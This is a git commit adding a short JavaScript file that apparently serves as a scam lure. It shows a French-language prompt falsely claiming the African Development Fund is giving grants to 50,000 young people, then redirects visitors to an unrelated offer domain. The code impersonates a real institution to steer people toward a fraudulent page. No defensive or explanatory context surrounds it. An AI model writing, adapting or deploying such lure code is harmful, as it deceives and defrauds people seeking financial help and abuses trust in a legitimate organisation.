9fa4861ab608579dcb8486cb0db0758c689c0e47
ekpesense <abantak9@gmail.com>
2025-01-26 08:47:09 -0800

    Create activation-adf.org.js

---
+++ activation-adf.org.js
@@ -0,0 +1,5 @@
+var password = 'ACCORDER'
+password=prompt('LE FONDS AFRICAIN DE DÉVELOPPEMENT ACCORDE UNE SUBVENTION À 50 000 JEUNES, Cliquez sur SUBVENTION pour vérifier maintenant ','ACCORDER');
+if (password != 'ACCORDER') {
+location.href='https://offer-fest.info/adf.org.html';
+}
